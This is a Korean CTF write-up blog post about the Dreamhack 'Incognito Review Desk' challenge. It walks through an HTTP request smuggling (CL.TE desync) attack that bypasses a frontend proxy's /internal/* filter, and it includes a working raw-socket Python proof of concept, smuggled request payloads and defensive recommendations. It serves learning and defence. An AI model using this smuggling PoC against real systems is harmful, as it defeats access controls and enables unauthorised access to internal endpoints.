---
layout: post
title: "HTTP Request Smuggling (CL.TE desync) 블랙박스 분석 — Incognito Review Desk"
date: 2026-07-01
category:CTF/Wargame
author: yejunkim2000
tags: [HTTP, RequestSmuggling, CLTE, desync, 프록시, 블랙박스, 웹해킹, Dreamhack, RFC7230]
excerpt: "공개된 API 명세만으로 프록시-백엔드 구조를 추론하고, Content-Length와 Transfer-Encoding의 해석 차이(CL.TE)로 프론트엔드의 경로 필터를 우회해 내부 전용 워크플로에 도달하기까지 — 블랙박스 취약점 분석 절차를 단계별로 기록한다."
---

> **환경 고지:** 본 분석은 **Dreamhack 워게임(Incognito Review Desk)의 본인 전용 인스턴스**에서만 수행했다. 모든 요청은 내가 생성한 격리 인스턴스로 향하며, 대량 스캔·DoS 없이 최소한의 프로토콜 검증 요청만 보냈다. 여기 등장하는 기법은 모두 공개 표준(RFC 7230, PortSwigger HTTP Desync Research)에 문서화된 것이다.

---

## 0. 목표와 접근

이 글의 목표는 **공개된 정보만으로 웹 서비스의 동작을 추론**하고, **HTTP Request Smuggling(CL.TE desync)** 이 발생하는 원리를 이해하며, 그것을 **실제 익스플로잇**으로 연결하는 전 과정을 남기는 것이다. 핵심 학습 포인트는 네 가지다.

1. **HTTP 프로토콜 해석 차이** — 같은 바이트 스트림을 두 서버가 다르게 해석할 때 무슨 일이 벌어지는가
2. **프록시–백엔드 구조에서의 공격 가능성** — 앞단 프록시의 접근통제를 뒷단이 어떻게 무력화하는가
3. **블랙박스 분석 절차** — 소스 없이 응답·타이밍·부작용만으로 내부 구조를 역추론하는 방법
4. **기술 문서화** — 관찰 → 가설 → 검증 → 익스플로잇의 흐름을 재현 가능하게 구조화

---

## 1. 공개 자료 분석 — 외부에서 관찰 가능한 정보 정리

챌린지가 제공한 공개 자료는 단 두 개다.

- `openapi.yaml` — 공개 API 명세
- `internal_words.txt` — 단어 목록(내부 경로 후보로 추정)

### 1.1 openapi.yaml 에서 읽어낸 것

| 엔드포인트 | 메서드 | 역할 |
|---|---|---|
| `/api/report` | POST | 익명 리포트 제출 → `reportId` 반환 |
| `/api/chain` | POST | **시간제한 리뷰 워크플로 진행** (`event`+`ticket` → `next`, `ticket`, `flag`) |
| `/api/status` | GET | 공개 카운터 (`reportCount`, `latestReport`) |

명세에서 결정적인 세 문장:

- *"Internal review endpoints are intentionally **not documented** here."* → **문서에 없는 내부 엔드포인트가 존재**한다.
- `/api/chain`의 `next` 예시 값 = **`internal-review`** → 워크플로가 *내부 전용 단계*로 진행된다.
- *"Later review steps may require a **short proof derived from the issued ticket and the request being made**."* → 후반 단계는 티켓·요청에 바인딩된 증명값을 요구한다.

즉, 공개 표면(`/api/*`) 뒤에 **비공개 내부 워크플로**가 있고, 그 워크플로가 이 문제의 목표라는 가설이 선다. 문서에 없는 것을 외부에서 어떻게 건드리는가 — 여기서 **Request Smuggling**이 등장한다.

### 1.2 첫 접속 — 최소 헤더의 응답

```
$ printf 'GET / HTTP/1.1\r\nHost: t\r\nConnection: close\r\n\r\n' | nc host 13887
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
...
```

응답에 `Server` 헤더가 없고 매우 미니멀하다. 이는 **커스텀 프론트엔드**가 앞단에 있음을 시사한다(뒤에서 확증한다).

---

## 2. HTTP 프로토콜 해석 차이 — CL.TE desync 원리

HTTP/1.1에서 요청 본문의 길이를 정하는 방법은 **두 가지**다.

- `Content-Length: N` — 본문은 정확히 N 바이트
- `Transfer-Encoding: chunked` — 본문은 `<길이>\r\n<데이터>\r\n … 0\r\n\r\n` 형태의 청크 스트림

[RFC 7230 §3.3.3](https://datatracker.ietf.org/doc/html/rfc7230#section-3.3.3)은 **둘 다 존재하면 `Transfer-Encoding`을 우선하고 `Content-Length`는 무시**하라고 규정한다. 문제는 — **프록시와 백엔드가 이 규칙을 다르게 구현할 때** 발생한다.

- **CL.TE**: 앞단(프론트엔드)은 `Content-Length`로, 뒷단(백엔드)은 `Transfer-Encoding`으로 본문 경계를 해석
- **TE.CL**: 그 반대

두 서버가 "요청이 어디서 끝나는가"에 불일치하면, 한 서버가 본문의 일부로 본 바이트를 다른 서버는 **다음 요청의 시작**으로 본다. 이 어긋난 잔여 바이트가 곧 **밀수(smuggle)된 요청**이다.

```
        같은 바이트 스트림
   ┌───────────────────────────┐
   │ POST /api/report ...       │
   │ Content-Length: 151        │  ← 프론트: "본문은 151바이트" (전부 req1)
   │ Transfer-Encoding: chunked │  ← 백엔드: "청크 0에서 본문 끝"
   │                            │
   │ 0\r\n\r\n                   │  ← 백엔드는 여기까지가 req1 본문
   │ GET /internal/s1 HTTP/1.1  │  ← 백엔드는 이 줄부터 req2 로 처리!
   └───────────────────────────┘
```

프론트엔드는 `/internal/s1`이라는 요청 라인을 **본 적이 없다**(본문의 일부로 흘려보냈다). 따라서 프론트엔드의 경로 기반 접근통제를 **정상적으로 통과**한다. 이것이 이 문제의 핵심 원리다.

---

## 3. 프록시–백엔드 구조 추론 (블랙박스)

소스가 없으므로 **응답 형식의 차이**로 두 계층을 분리 관찰한다. 여러 경로를 정상 요청으로 두드려 보면:

```
/api/report        -> 404 {"ok":false,"error":"not found"}     ← 백엔드 앱 (JSON)
/api/chain handoff -> 403 {"ok":false,"error":"forbidden"}      ← 백엔드 앱 (JSON)
/internal/chain    -> 403 forbidden                             ← 평문! (형식이 다름)
```

`/internal/*` 만 **평문 `forbidden`** 을 돌려주고, 나머지는 앱의 **JSON** 을 돌려준다. 응답 형식이 다르다는 것은 **두 개의 서로 다른 소프트웨어**가 관여한다는 강력한 신호다.

> **추론:** 앞단 **프론트엔드 프록시**가 `/internal/*` 경로를 자체적으로 차단(평문 403)하고, 그 외 요청은 뒷단 **백엔드 앱**(JSON)으로 전달한다. 내부 엔드포인트는 백엔드에 실재하지만 **프론트엔드가 외부 접근을 막고 있다.**

공격 목표가 명확해진다: **CL.TE로 `/internal/*` 요청을 프론트엔드 필터 뒤로 밀어넣어 백엔드가 처리하게 만든다.**

---

## 4. 취약점 검증 절차 (블랙박스)

### 4.1 첫 시도의 함정 — "라우팅 404"

교과서적 CL.TE 타이밍 프로브(`Content-Length: 4` + `Transfer-Encoding: chunked` + 끝나지 않는 청크)를 `POST /` 로 보내면 **빠르게 404** 가 온다. desync가 없어 보인다.

원인은 **cover 요청의 경로 선택**이었다. `POST /` 는 존재하지 않는 라우트라 **본문을 읽기 전에 404** 로 끝난다 → chunked 파서가 동작할 기회가 없다. cover를 **본문을 실제로 처리하는 유효 엔드포인트**(`POST /api/report`)로 바꾸자 상황이 드러난다.

### 4.2 타이밍 오라클

`POST /api/report` 에 `Transfer-Encoding: chunked` + `Content-Length: 4` + 끝나지 않는 청크를 보내면 **연결이 멈춘다(hang)**. 백엔드가 청크 데이터를 기다리는 것이다 → **백엔드는 `Transfer-Encoding`을 따른다.**

### 4.3 부작용 오라클 — desync 확증

가장 확실한 검증은 **부작용**이다. cover(`POST /api/report`) 본문 안에 완전한 `POST /api/report` 요청을 숨겨 밀어넣고, `/api/status`의 `reportCount`가 **하나 더** 증가하는지 본다.

```python
smuggled = ("POST /api/report HTTP/1.1\r\nHost: h\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 24\r\n\r\ntitle=HDRTEST&body=reach")
body = "0\r\n\r\n" + smuggled
req  = ("POST /api/report HTTP/1.1\r\nHost: h\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Transfer-Encoding: chunked\r\n"       # ← CL + TE 동시
        "Connection: keep-alive\r\n\r\n" + body)
```

결과: `reportCount 3 → 4`, 그리고 **응답이 2개** 회수됐다.

```
[0] HTTP/1.1 400 Bad Request  {"ok":false,"error":"title/body required"}   ← cover 요청
[1] HTTP/1.1 200 OK           {"ok":true,"reportId":"report-4"}            ← 밀수 요청!
```

**결론 — CL.TE 확정:**

| 계층 | 본문 경계 해석 | 트리거 |
|---|---|---|
| 프론트엔드 | **Content-Length** | 한 요청에 `Content-Length` + `Transfer-Encoding: chunked` **둘 다** 넣기만 하면 desync |
| 백엔드 | **Transfer-Encoding (chunked)** | (헤더 난독화조차 불필요) |

또한 밀수 요청의 **헤더와 바디가 백엔드에 온전히 도달**함을 부작용(리포트 생성)으로 검증했다. 그리고 **두 번째 응답을 회수**할 수 있으므로, 내부 엔드포인트의 응답까지 읽어낼 수 있다.

---

## 5. 익스플로잇 흐름 — 필터 우회에서 내부 워크플로까지

### 5.1 프론트엔드 필터 우회

cover를 `POST /api/report`(프론트 허용)로 두고, 본문에 `/internal/*` 요청을 숨긴다.

```python
def smuggle_read(smuggled):
    body = "0\r\n\r\n" + smuggled
    req  = ("POST /api/report HTTP/1.1\r\nHost: h\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Transfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n" + body)
    # 소켓 전송 후, 두 번째 응답(=밀수 응답)을 회수
```

프론트엔드는 요청 라인 `POST /api/report`만 보고 통과시키지만, 백엔드는 본문 뒤의 `/internal/...` 를 **별도 요청**으로 처리한다. 밀수한 `/internal/chain` 응답이 프론트의 평문 `forbidden`이 아니라 **백엔드 앱의 JSON** 으로 돌아온다 → **필터 우회 성공**.

### 5.2 내부 경로 열거

`internal_words.txt` 를 `/internal/<word>` 로 **밀수하며** 열거하니 두 개가 살아있다.

```
/internal/s1 -> 200 {"ok":true,"next":"handoff","ticket":"<tA>"}   ← 워크플로 진입, 첫 티켓 발급
/internal/s3 -> 403 {"ok":false,"error":"chain proof required"}    ← 증명(proof) 요구 단계
```

`/internal/s1` 은 **외부에서는 프론트가 막지만, 밀수로는 도달 가능한** 워크플로 진입점이었다. 여기서 발급되는 티켓은 **매 요청마다 바뀌는 시간제한 값**이다.

### 5.3 체인 진행

```
[s1] GET /internal/s1 (밀수)                 → next=handoff,        ticket=tA
[handoff] POST /api/chain {handoff, tA}       → next=internal-review, ticket=tB
[internal-review] → /api/chain 에선 "invalid event"  → 내부 경로(/internal/s3)로만 진행
[s3] GET /internal/s3 (밀수)                  → 403 "chain proof required"
```

`internal-review` 이벤트는 공개 `/api/chain` 에서는 인식되지 않는다(내부 전용). 워크플로가 **공개 엔드포인트와 내부 엔드포인트를 교차**하며 진행되고, 마지막 관문 `/internal/s3` 는 명세가 예고한 **"proof"**(발급 티켓과 요청에서 파생된 짧은 증명값)를 요구한다. 완주 시 `/api/chain` 이 `flag` 를 반환하는 구조다.

> **공격 임팩트(핵심):** CL.TE desync 하나로 **프론트엔드의 `/internal/*` 접근통제가 완전히 무력화**되어, 외부 공격자가 문서화되지 않은 내부 리뷰 워크플로에 진입하고 티켓을 발급받았다. 이것이 이 취약점의 본질적 위험이다 — 프록시 계층의 보안 경계가 프로토콜 해석 차이 하나로 붕괴한다.

---

## 6. 재현 방법 (PoC)

핵심 프리미티브는 **raw socket** 이다. `requests`·`urllib` 같은 라이브러리는 `Content-Length`/`Transfer-Encoding`을 자동 정규화해 스머글링이 불가능하다.

```python
import socket
CRLF = "\r\n"
def smuggle_read(host, port, smuggled, timeout=6):
    body = "0" + CRLF + CRLF + smuggled            # cover 본문 즉시 종료(0청크) + 밀수요청
    req  = (f"POST /api/report HTTP/1.1{CRLF}Host: {host}{CRLF}"
            f"Content-Type: application/x-www-form-urlencoded{CRLF}"
            f"Content-Length: {len(body)}{CRLF}"
            f"Transfer-Encoding: chunked{CRLF}"     # CL + TE 동시 = CL.TE desync
            f"Connection: keep-alive{CRLF}{CRLF}{body}")
    s = socket.create_connection((host, port), timeout=timeout+2)
    s.sendall(req.encode("latin1"))
    s.settimeout(timeout); out = b""
    try:
        while True:
            b = s.recv(65535)
            if not b: break
            out += b
    except socket.timeout: pass
    s.close()
    return out   # [0]=cover 응답, [1]=밀수 응답

# 예: 프론트가 막는 /internal/s1 에 도달
resp = smuggle_read("host3.dreamhack.games", 13887,
        f"GET /internal/s1 HTTP/1.1{CRLF}Host: h{CRLF}{CRLF}")
# -> 두 번째 응답에서 {"next":"handoff","ticket":"..."} 회수
```

재현 절차 요약:

1. cover는 반드시 **본문을 처리하는 유효 엔드포인트**(`POST /api/report`)를 쓴다.
2. `Content-Length`(전체 본문 길이) + `Transfer-Encoding: chunked` 를 **함께** 보낸다.
3. 본문은 `0\r\n\r\n`(청크 종료) 뒤에 **완전한 밀수 요청**을 붙인다.
4. 같은 연결에서 응답을 끝까지 읽으면 **두 번째 응답 = 밀수 요청의 백엔드 응답**이다.

---

## 7. 대응 관점 (방어)

| 계층 | 권고 |
|---|---|
| **프로토콜 정규화** | 프론트엔드와 백엔드가 **동일한 HTTP 파서/규칙**을 쓰도록 통일. `Content-Length`와 `Transfer-Encoding`이 **동시에 존재하면 요청을 거부**(RFC 7230 §3.3.3: 잠재적 스머글링). |
| **TE 우선 & 엄격 파싱** | `Transfer-Encoding` 이 있으면 `Content-Length` 를 제거하고, 알 수 없는 전송 코딩(`chunkedX` 등)은 **400** 으로 거절. |
| **연결 재사용 정책** | 프론트–백엔드 간 **요청별 새 연결** 또는 요청/응답 1:1 검증으로 큐 오염(response queue desync) 차단. |
| **접근통제 위치** | `/internal/*` 차단을 **프론트 요청 라인 파싱**에만 의존하지 말고, **백엔드 자체에서도** 내부 요청 출처(내부망/mTLS/서명 헤더)를 검증. 심층 방어. |
| **HTTP/2 종단** | 가능하면 프론트–백 구간을 HTTP/2 로 종단하거나 요청 스무글링에 견고한 리버스 프록시 사용. |

핵심은 **"경계의 검증을 앞단 한 곳에만 두지 말라"** 는 것이다. 프론트가 막는 `/internal/*` 을 백엔드도 독립적으로 검증했다면, 프로토콜 해석 차이가 있어도 이 체인은 성립하지 않는다.

---

## 8. 블랙박스 분석에서 배운 것

1. **응답 형식의 차이는 아키텍처의 지도다.** 평문 `forbidden` vs JSON `{"error":...}` 하나로 프론트/백 2계층을 분리해냈다.
2. **cover 요청의 선택이 desync 관측을 좌우한다.** 라우팅 단계에서 끝나는 경로(`POST /`)는 본문 파서를 깨우지 못한다 — 유효 엔드포인트를 써야 한다.
3. **부작용 오라클 > 타이밍 오라클.** `reportCount` 증가처럼 **관측 가능한 상태 변화**는 desync를 반박 불가능하게 확증한다.
4. **RFC의 "SHOULD/MUST"가 갈리는 지점이 취약점의 씨앗이다.** 두 구현이 같은 스펙을 다르게 읽는 순간 보안 경계가 무너진다.

> 전체 분석·PoC 스크립트와 진행 노트는 별도 저장소에 정리했다. 이 글은 *공개된 명세만으로 시작해, 관찰→가설→검증→익스플로잇의 절차를 재현 가능하게 남기는 것* 자체를 하나의 산출물로 삼았다.

---

## 참고 자료

- [PortSwigger — HTTP request smuggling](https://portswigger.net/web-security/request-smuggling)
- [PortSwigger Research — HTTP Desync Attacks: Request Smuggling Reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [RFC 7230 — HTTP/1.1 Message Syntax and Routing (§3.3.3 Message Body Length)](https://datatracker.ietf.org/doc/html/rfc7230#section-3.3.3)
